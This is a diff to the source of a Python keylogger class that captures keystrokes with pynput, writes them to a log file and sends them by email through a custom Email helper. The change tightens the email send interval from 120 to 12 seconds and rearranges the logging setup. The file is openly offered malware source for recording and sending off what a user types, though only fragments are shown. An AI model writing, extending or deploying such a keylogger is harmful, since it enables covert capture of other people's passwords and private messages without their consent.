@@ -1,6 +1,5 @@
 from pynput.keyboard import Key, Listener # used to listen to keystrokes
 import logging, time  # import used to log, get elapsed time
-from logging.handlers import TimedRotatingFileHandler # used to rotate logs 
 from myemail import Email
 
 class KeyLogger:
@@ -18,17 +17,21 @@ class KeyLogger:
         # email obj
         self.email = mail
 
-        # buffer and logging
-        self.mem = []
-        self.filename = "key_log.txt"
-        logging.basicConfig(filename=(log_dir + self.filename), level=logging.INFO, format='%(asctime)s: %(message)s')
-
         # times for last updates
         self.start_time = time.time()
         self.email_time = self.start_time
         self.log_flush_time = 10 # seconds until log flush
-        self.email_send_time = 120 # seconds until email sent
-        
+        self.email_send_time = 12 # seconds until email sent
+
+        # buffer and logging config
+        self.mem = []
+        self.filename = "key_log.txt"
+        logging.basicConfig(
+            filename=(log_dir + self.filename), 
+            level=logging.INFO, 
+            format='%(asctime)s: %(message)s', 
+        )
+
     def run_keylogger(self):
         """
         Runs keylogger. key_log.txt will be updated every 10 seconds and 
@@ -64,7 +67,6 @@ class KeyLogger:
             self.email_time = time.time()
             # TODO rollover log
     
-
     def __check_time(self, check, curr_time):
         """
         private function used to decide if appropriate to continue based on time
